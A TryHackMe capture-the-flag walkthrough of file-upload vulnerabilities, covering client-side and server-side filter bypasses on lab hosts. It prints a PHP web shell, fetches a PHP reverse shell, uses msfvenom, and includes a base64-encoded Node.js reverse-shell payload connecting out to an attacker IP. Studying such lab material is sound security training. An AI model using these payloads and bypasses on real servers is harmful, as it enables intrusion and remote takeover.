```
  _    _       _                 _  __      __    _                      _     _ _ _ _   _           
 | |  | |     | |               | | \ \    / /   | |                    | |   (_) (_) | (_)          
 | |  | |_ __ | | ___   __ _  __| |  \ \  / /   _| |_ __   ___ _ __ __ _| |__  _| |_| |_ _  ___  ___ 
 | |  | | '_ \| |/ _ \ / _` |/ _` |   \ \/ / | | | | '_ \ / _ \ '__/ _` | '_ \| | | | __| |/ _ \/ __|
 | |__| | |_) | | (_) | (_| | (_| |    \  /| |_| | | | | |  __/ | | (_| | |_) | | | | |_| |  __/\__ \
  \____/| .__/|_|\___/ \__,_|\__,_|     \/  \__,_|_|_| |_|\___|_|  \__,_|_.__/|_|_|_|\__|_|\___||___/
        | |                                                                                          
        |_|                                                                                          
```
This THM walkthrough is a tutorial room exploring some basic file-upload vulnerabilities
in websites. [^1]

Task 1 - Getting Started
-----------------------------------------------------------------------------------------
**I have configured the host file of the attack machine as instructed.**

The host file can be used to link domain names to certain IP addresses and thus resolve
them. However, the host file is also a popular target for malware, which infiltrates the
system and changes the file by itself, e.g. leading users to be directed to dangerous
sites and certain addresses being blocked. In short, the host file is used for local
domain name mapping, bypassing DNS. This is useful in Try Hack Me, where DNS is not
available as it allows us to manually map one or more (sub-)domains to an IP address of
our choosing. Upon opening the website in the browser, we are instructed to access this
server with one of the virtual hosts, by adding them to the `/etc/hosts` file.
```text
    overwrite.uploadvulns.thm
    shell.uploadvulns.thm
    java.uploadvulns.thm
    annex.uploadvulns.thm
    magic.uploadvulns.thm
    jewel.uploadvulns.thm

<TARGET_IP_ADDRESS> overwrite.uploadvulns.thm shell.uploadvulns.thm
    java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm
    jewel.uploadvulns.thm demo.uploadvulns.thm (Rickroll)
```
Now, we can access these virtual hosts by visiting them in the browser window.

Task 4 - Overwriting Existing Files
-----------------------------------------------------------------------------------------
**What is the name of the image file which can be overwritten?**

For this task, we visit the `overwrite.uploadvulns.thm` site and then inspect
the source code of the website, to discover that the image in the background is
saved under `images/mountains.jpg`.

**After successfully overwriting the image, what is the flag we receive?**

So, it is our objective to upload our own malicious *image* text file with the name
`mountains.jpg` to the website as instructed. With this, we get rewarded with the flag.

Task 5 - Remote Code Execution
-----------------------------------------------------------------------------------------
**Run a Gobuster scan on the website using the syntax from above. What directory looks
like it might be used for uploads?**

For this task, we visit the "shell.uploadvulns.thm" site and then perform a
`gobuster` scan to find directories that may be used for uploads.

```sh
$ gobuster dir -u http://shell.uploadvulns.thm
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
We thus find the `/resources` and `/assets` folders and suspect the `/resources`
directory to be used for uploads. It seems likely, that any files we upload to the
site will be placed in this directory. And indeed, by trying to upload the legitimate
image file `mountains.jpg` and moving to `/resources` we can see it listed in the
index.

**Get either a web shell or a reverse shell. What's the flag in the `/var/www/`
directory?**

Next, we want to inject some PHP code to the `webshell.php` PHP script and upload it to
the site once again containing the following lines of code:
```php
<?php
    echo system($_GET["cmd"]);
?>
```
This code takes the *GET* parameter and executes it as a system command, which echoes
the output to the screen. Now, we can access the uploaded PHP script by visiting the
`/resources/test.php` contents and provide the "cmd" parameter. \
`view-source:http://shell.uploadvulns.thm/resources/webshell.php?cmd=ls%20/var/www` \
This way, we find out that the `flag.txt` and `html` files are stored in this directory.
Of course, we want to access the `flag.txt` and so we use `cat` command for it.
Upon visiting this site we get the flag. \
`http://shell.uploadvulns.thm/resources/webshell.php?cmd=cat%20/var/www/flag.txt` \
Alternatively, we could have aimed to get a reverse shell. For this we rely on
the reverse shell implementation in PHP from a GitHub project:
```sh
$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/
    php-reverse-shell.php
```
Then, we need to change the IP address to our Attack Box IP address and start
a netcat listener on the port that was provided, e.g. 1234: `$ nc -lvnp 1234`

Upon accessing the page under `/resources/php-reverse-shell.php` we get a shell
while the page hands and is loading in the browser window. This allows us to
print the contents of the flag file: `$ cat /var/www/flag.txt`

Task 6 - Filtering
-----------------------------------------------------------------------------------------
**What is the traditionally predominant server-side scripting language?**

While JavaScript is pretty much common as the client-side scripting language, *PHP* is
the predominant server-side language.

**When validating by file extension, what would you call a list of accepted extensions
(whereby the server rejects any extension not in the list)?**

If we use a filter that checks for file extensions we may use a *whitelist*, i.e. a list
of extensions that are allowed while everything else is rejected.

**What MIME type probably occurs when uploading a CSV file?**

In MIME, i.e. *Multipurpose Internet Mail Extension*, types are following the format
`<type>/<subtype>` so for a CSV file, we would expect the "text/csv" type specification.

Task 7 - Bypass Client-Side Filtering
-----------------------------------------------------------------------------------------
**What is the flag in /var/www/?**

For this task, we go to the `java.uploadvulns.thm` site and investigate the following
approaches to bypass client-side filtering:

1. Turn off JavaScript in the browser completely and check if it prevents the site from
   working and if it can be used to bypass the client-side filter.
2. Intercept and modify the incoming page with BurpSuite to strip out the Java-Script
   filter before it has a change to run.
3. Intercept and modify the file upload after it has already passed the filter.
4. Send the file directly using `curl` to bypass the client-side webpage filter.

If we look at the source code of the web application, we get suspicious of the
`client-side-filter.js` file, so we open it. There, we find out that the filter is
using a whitelist to exclude any MIME type that isn't a PNG image. Then, we start
BurpSuite and the FoxyProxy to intercept a request. In order to see the server's
response, we can right click the intercepted data and select the form
`Do Intercept > Response to this request > Forward`. Now, we can delete the script
inline to the client-side filtering or remove the `^js$|` condition under the
intercept client requests section to load the external JavaScript file. Next, we
once again download the reverse PHP shell, set it's IP address to the AttackBox IP
and start a `netcat` listener on the specified port. Then, we can upload the php file
(renamed with png file extension) and intercept the request with BurpSuite. Here, we
can set the `image/png` to `text/x-php` and `.jpg` to `.php`, since the request has
already been gone through the filtering. Finally, we want to access the file after it
was successfully uploaded to get a shell. For, this we need `gobuster` in a similar
fashion as previously since the upload directory has changed to *images*. So, we open
`/images/php-reverse-shell.php` and get a shell on `nc`. Now we only want to print the
flag contents with `cat /var/www/flag.txt`.

Task 8 - Bypass Server-Side Filtering: File Extensions
-----------------------------------------------------------------------------------------
**What is the flag in /var/www/ in annex.uploadvulns.thm?**

We still rely on the `php-reverse-shell.php` script for a reverse shell and now want to
attack a server-side file upload filtering. Through trial and error, we find out that the
`.php5` file extension is allowed. With `gobuster`, we discover the `/privacy` folder and
upon accessing the `php-reverse-shell.php5` script there, we get a shell and can print
the flag contents with `cat /var/www/flag.txt`.

Task 9 - Bypass Server-Side Filtering: Magic Numbers
-----------------------------------------------------------------------------------------
**Grab the flag from magic.uploadvulns.thm under /var/www/.**

This web server compares the magic number of the input files and allows only those with
a *GIF* hex signature of `47 49 46 38 37 61`. So, we use `hexedit` to change the magic
number at the beginning of the file after 6 A's have been prepended to it (to not change
the actual php magic number for the server). With `gobuster` we find the directory
`/graphics/` where the uploaded files are stored and after successfully uploading the
reverse PHP shell, we can go to the `/graphics/php-reverse-shell.php` location and get
a shell for the flag printing.

Task 11 - Challenge
-----------------------------------------------------------------------------------------
**Hack jewel.uploadvulns.thm and grab the flag from /var/www/.**

1. First, we want to look at the website as a whole e.g. with the *Wappalyzer* Firefox
   extension or to be more certain by making a BurpSuite request to the website. In
   addition, it might be useful to search for an upload page.

This way, we find out that the website runs on jQuery with the version 3.5.1 but with
BurpSuite we are able to find out that the server is "nginx/1.14.0" and the
`x-powered-by` is set to *express*.

In addition to this active reconnaissance, we perform a directory search with:
```text
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    -u http://jewel.uploadvulns.thm
```
This results in these directories with the status codes: `/content` (Status: 301),
`/modules` (Status: 301), `/admin` (Status: 200) and `/assets` (Status: 301)
So far, we are only able to access the /admin file upload page as the others are
not found on the server.

2. Now, we want to inspect this upload page further. In particular, we want to
   look at the source code for client-side scripts to determine if there are any
   client-side filters which can be bypassed as it is completely in our control.

When looking at the source code of the home page we discover the `upload.js` file
containing this client-side filter which can be easily bypassed:
```
    // make sure the file size is not bigger than 400 KiB
    if (event.target.result.length > 50 * 8 * 1024){
    	setResponseMsg("File too big", "red");
    	return;
    }
    // check if the magic number is "FF D8 FF" a JPG
    if (atob(event.target.result.split(",")[1]).slice(0,3) != "ÿØÿ"){
    	setResponseMsg("Invalid file format", "red");
    	return;
    }
    // check if the file extension following the first dot is a JPG or JPEG
    const extension = fileBox.name.split(".")[1].toLowerCase();
    if (extension != "jpg" && extension != "jpeg"){
    	setResponseMsg("Invalid file format", "red");
    	return;
    }
```
So, it is our objective to create an *image* file with the file extension *JPG*
or *JPEG* which is not bigger than 400 KiB and has the magic number `ÿØÿ`. So, we
create such a file where we prepend 3 A's and then use the `hexedit` tool to
change the magic number.

Next, we want to search for a payload which gives us a reverse shell in express,
i.e. Node.js with JavaScript. For this cause we use `msfvenom` in this way:
```text
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=3388 -o shell.js
```
After having changed the extension from `.js` to `.jpg` and having changed the magic
number we can successfully upload the *image* and now try to search for it.

3. After attempting the file upload we can look at how the file is accessed.
   Note, that it might be useful to attempt a completely innocent file upload
   just to intercept the request in transmission.

We can perform a directory search with the file extension .jpg to append it to
the downloaded wordlist. This way we want to find out how our file was renamed:
```text
# gobuster dir -w UploadVulnsWordlist_1593564107766.txt -x jpg
    -u http://jewel.uploadvulns.thm/content/

/ABH.jpg (Status: 200)
/BVH.jpg (Status: 200)
/LKQ.jpg (Status: 200)
/SAD.jpg (Status: 200)
/UAD.jpg (Status: 200)
```
Here, we can't discover our shell due to the missing file size and the same .jpg
file extension as all the others. So, we repeat the previous process but change
the file extension to .jpeg in the hope that this will differentiate the file
from the others. Still, the file ending is `.jpg` for all the files but one file
was added, so `content/OTC.jpg` must be the newly added JavaScript file. With
high hopes, we start a listening service with `nc -lvnp 3388` and then enter
`../content/OTC.jpg` in the admin page. But it doesn't work as expected.

So, as it was expected of us, we upload a legitimate image file under 400 KiB
and upload it to the jewel page while we intercept the request in BurpSuite.
And we can see that the file provided alongside its name and MIME type, to then
be encoded in base64. It is then our idea, to encode our shellcode payload too:
```text
# cat shell.jpg | base64
KGZ1bmN0aW9uKCl7IHZhciByZXF1aXJlID0gZ2xvYmFsLnJlcXVpcmUgfHwgZ2xvYmFsLnByb2Nl
c3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDsgaWYgKCFyZXF1aXJlKSByZXR1cm47IHZh
ciBjbWQgPSAoZ2xvYmFsLnByb2Nlc3MucGxhdGZvcm0ubWF0Y2goL153aW4vaSkpID8gImNtZCIg
OiAiL2Jpbi9zaCI7IHZhciBuZXQgPSByZXF1aXJlKCJuZXQiKSwgY3AgPSByZXF1aXJlKCJjaGls
ZF9wcm9jZXNzIiksIHV0aWwgPSByZXF1aXJlKCJ1dGlsIiksIHNoID0gY3Auc3Bhd24oY21kLCBb
XSk7IHZhciBjbGllbnQgPSB0aGlzOyB2YXIgY291bnRlcj0wOyBmdW5jdGlvbiBTdGFnZXJSZXBl
YXQoKXsgY2xpZW50LnNvY2tldCA9IG5ldC5jb25uZWN0KDMzODgsICIxMC4xMC43Ny4xNjMiLCBm
dW5jdGlvbigpIHsgY2xpZW50LnNvY2tldC5waXBlKHNoLnN0ZGluKTsgaWYgKHR5cGVvZiB1dGls
LnB1bXAgPT09ICJ1bmRlZmluZWQiKSB7IHNoLnN0ZG91dC5waXBlKGNsaWVudC5zb2NrZXQpOyBz
aC5zdGRlcnIucGlwZShjbGllbnQuc29ja2V0KTsgfSBlbHNlIHsgdXRpbC5wdW1wKHNoLnN0ZG91
dCwgY2xpZW50LnNvY2tldCk7IHV0aWwucHVtcChzaC5zdGRlcnIsIGNsaWVudC5zb2NrZXQpOyB9
IH0pOyBzb2NrZXQub24oImVycm9yIiwgZnVuY3Rpb24oZXJyb3IpIHsgY291bnRlcisrOyBpZihj
b3VudGVyPD0gMTApeyBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgeyBTdGFnZXJSZXBlYXQoKTt9LCA1
KjEwMDApOyB9IGVsc2UgcHJvY2Vzcy5leGl0KCk7IH0pOyB9IFN0YWdlclJlcGVhdCgpOyB9KSgp
Owo=
```
We then exchange the legitimate image file's string with this base64 encoded
reverse shell generation payload and forward the modified packet. This was a
successful upload and we once again need to find out the newly uploaded file's
filename with `gobuster`. There, the file `ZVX.jpg` is printed which wasn't
there before and we can once again start a netcat listener before providing the
input `../content/ZVX.jpg` in the admin page. The admin page now does it's job
in activating the malicious script from the `/modules` directory and we get a
shell. The last step is to read the contents of the `var/www/flag.txt file.

[^1]: https://tryhackme.com/room/uploadvulns
